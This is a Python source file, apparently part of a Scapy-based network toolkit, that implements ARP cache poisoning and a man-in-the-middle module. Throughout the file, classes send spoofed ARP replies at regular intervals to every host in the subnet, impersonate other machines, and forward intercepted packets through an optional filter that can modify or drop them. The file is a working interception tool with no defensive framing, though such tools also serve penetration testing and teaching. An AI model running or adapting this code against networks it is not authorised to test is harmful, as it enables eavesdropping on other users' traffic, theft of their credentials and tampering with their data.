# coding: utf-8
from .forward import ForwarderModule
from .sniffer import Module
from . import net
import scapy.all as scapy
import threading
import time
import logging
import itertools

logger = logging.getLogger(__name__)

class ArpCacheModule(Module):
    """
    ArpCacheModule listens for ARP messages and provides a cache of the ARP associations seen on the network.
    It ignores ARP messages sent from this host and any other hosts specified in ``ignore``,
    in order to avoid self-poisoning of the ARP cache when sending out spoofed ARP messsages.

    :param ignore: A set of MAC addresses. ARP messages with a source in ``ignore``
        will be ignored for building the ARP cache. Automatically includes the sniffer interface.
    :type ignore: set(str), optional
    """
    def __init__(self, ignore=None):
        self.sniffer = None
        self.ignore = set() if ignore is None else set(ignore)
        self.cache = {}

    def start(self, sniffer):
        self.sniffer = sniffer
        if self.sniffer.iface is not None:
            self.ignore.add(str(net.ifhwaddr(self.sniffer.iface)))

    def process(self, pkt):
        if scapy.Ether in pkt and scapy.ARP in pkt:
            src = pkt[scapy.Ether].src
            if src != '00:00:00:00:00:00' and src not in self.ignore:
                psrc = pkt[scapy.ARP].psrc
                if psrc != '0.0.0.0':
                    self.cache[psrc] = src

    def __contains__(self, key):
        return key in self.cache

    def __getitem__(self, key):
        return self.cache[key]

    def __iter__(self):
        return iter(self.cache)

    def __len__(self):
        return len(self.cache)

class ArpPoisonerModule(Module):
    """
    ArpPoisonerModule will send out spoofed ARP messages at regular intervals to poison the network.
    It also starts by sending out an arping to all targets to see who is on the network and populate the cache.

    :param arpcache: Mapping of MAC addresses to IP addresses.
    :type arpcache: mapping(str) -> str
    :param iface: Interface name over which ARP messages should be sent. Defaults to sniffer interface.
    :type iface: str, optional
    :param hwaddr: Source MAC address to set on outgoing messages. Defaults to interface MAC address.
    :type hwaddr: str, optional
    :param target: A Scapy network object designating targets for poisoning by IP. Defaults to interface subnet.
    :type target: scapy.Net, optional
    :param impersonate: A Scapy network object designating targets for impersonation by IP. Defaults to interface subnet.
    :type impersonate: scapy.Net, optional
    :param poison_interval: Interval, in seconds, for periodically sending poison messages.
    :type poison_interval: float, optional
    :param ping_interval: Interval, in seconds, for periodically scanning for targets.
    :type ping_interval: float, optional
    """
    def __init__(self, arpcache, iface=None, hwaddr=None, target=None, impersonate=None, poison_interval=2, ping_interval=30):
        self.arpcache = arpcache
        self.iface = iface
        self.poison_interval = poison_interval
        self.ping_interval = ping_interval
        self.hwaddr = hwaddr
        self.target = target
        self.impersonate = impersonate

        self.sniffer = None

        self._stopevent = threading.Event()
        self._thread = None

    @staticmethod
    def enumerate(net):
        if isinstance(net, str):
            net = scapy.Net(net)
        return net

    def arping(self, target=None):
        """Sends a batch of ARP who-has messages to the specified targets.

        :param target: IP addres targets for the ARP messages. Defaults to the union of ``target`` and ``impersonate`` sets.
        :type target: scapy.Net, optional
        """
        # Figure out who we are trying to resolve
        if target is None:
            if self.target is None or self.impersonate is None:
                pdst = net.ifcidr(self.iface).cidr()
            else:
                # It has to be a list because scapy can be really cool, but also kinda wonky
                pdst = list(set(self.enumerate(self.target)) | set(self.enumerate(self.impersonate)))
        else:
            pdst = target

        # who-has messages come from the IP address assigned to the interface we are sending from.
        psrc = str(net.ifaddr(self.iface))

        # Send out an arp "who-has" requests
        pkts = scapy.Ether(src=self.hwaddr, dst='ff:ff:ff:ff:ff:ff')/scapy.ARP(op='who-has', hwsrc=self.hwaddr, psrc=psrc, pdst=pdst)
        scapy.sendp(pkts, iface=self.iface)

    def packets(self, srcs, dsts):
        for src, dst in itertools.product(srcs, dsts):
            if src != dst:
                yield scapy.Ether(src=self.hwaddr, dst=self.arpcache[dst])/scapy.ARP(op='who-has', hwsrc=self.hwaddr, psrc=src, pdst=dst)
                yield scapy.Ether(src=self.hwaddr, dst=self.arpcache[dst])/scapy.ARP(op='is-at', hwsrc=self.hwaddr, psrc=src, pdst=dst)


    def arpoison(self, target=None, impersonate=None):
        """Sends a batch of poisoned ARP messages to the target set, impersonating the given hosts.

        :param target: IP addres targets for the ARP messages. Defaults to this modules ``target`` set.
        :type target: scapy.Net, optional
        :param impersonate: IP addres targets for the ARP messages. Defaults to this modules ``impersonate`` set.
        :type impersonate: scapy.Net, optional
        """
        # Chose the target and impersonation lists
        impersonate = impersonate or self.impersonate or net.ifcidr(self.iface).cidr()
        target = target or self.target or net.ifcidr(self.iface).cidr()

        # Filter out targets and impersonations not in our ARP cache
        pdst = [ip for ip in self.enumerate(target) if ip in self.arpcache]
        psrc = [ip for ip in self.enumerate(impersonate) if ip in self.arpcache]

        if psrc and pdst:
            # Launch the payload
            scapy.sendp(self.packets(psrc, pdst), iface=self.iface)

    def run(self):
        """Run the ARP poisoner module, periodically scanning and poisoning peers"""
        if self.hwaddr is None:
            self.hwaddr =  str(net.ifhwaddr(self.iface))

        # Poison the network and (re)scan at the specified intervals.
        next_ping, next_poison = 0, 0
        while not self._stopevent.is_set():
            now = time.time()
            if now > next_ping:
                self.arping()
                next_ping = now + self.ping_interval

            if now > next_poison:
                self.arpoison()
                next_poison = now + self.poison_interval

            time.sleep(min(next_ping - now, next_poison - now))

    def start(self, sniffer):
        """Start the ARP poisoner module. Called on ``sniffer.start()``"""
        self._stopevent.clear()
        self.sniffer = sniffer
        if self.iface is None:
            self.iface = self.sniffer.iface

        if self._thread is None or not self._thread.is_alive():
            self._thread = threading.Thread(target=self.run, daemon=True)
            self._thread.start()

    def stop(self):
        """Stop the ARP poisoner module. Called on ``sniffer.stop()``"""
        self._stopevent.set()

class ArpMitmModule(Module):
    """ArpMitmModule uses ARP poinsoning to MitM the network on the given interface.
    This module combines the ARP cache, ARP poisoner, and forwarder modules.

    :param filter: Filter, used by the forwarder, to modify or drop packets.
        Defaults to forwarding all packets, modifying only the source MAC address.
    :type filter:(function scapy.Packet -> scapy.Packet), optional
    :param iface: Interface name to execute the attack on. Defaults to the sniffer interface.
    :type iface: str, optional
    :param hwaddr: MAC address to use for outgoing packets.
    :type hwaddr: str, optional
    """
    def __init__(self, filter=None, iface=None, hwaddr=None):
        self.cache = ArpCacheModule(ignore=(hwaddr and [hwaddr]))
        self.poisoner = ArpPoisonerModule(self.cache, iface=iface, hwaddr=hwaddr)
        self.forwarder = ForwarderModule(self.cache, filter=filter, iface=iface, hwaddr=hwaddr)
        self.submodules = (self.cache, self.poisoner, self.forwarder)
        self.sniffer = None

    def start(self, sniffer):
        self.sniffer = sniffer
        for mod in self.submodules:
            mod.start(sniffer)

    def process(self, pkt):
        for mod in self.submodules:
            mod.process(pkt)

    def stop(self):
        for mod in self.submodules:
            mod.stop()
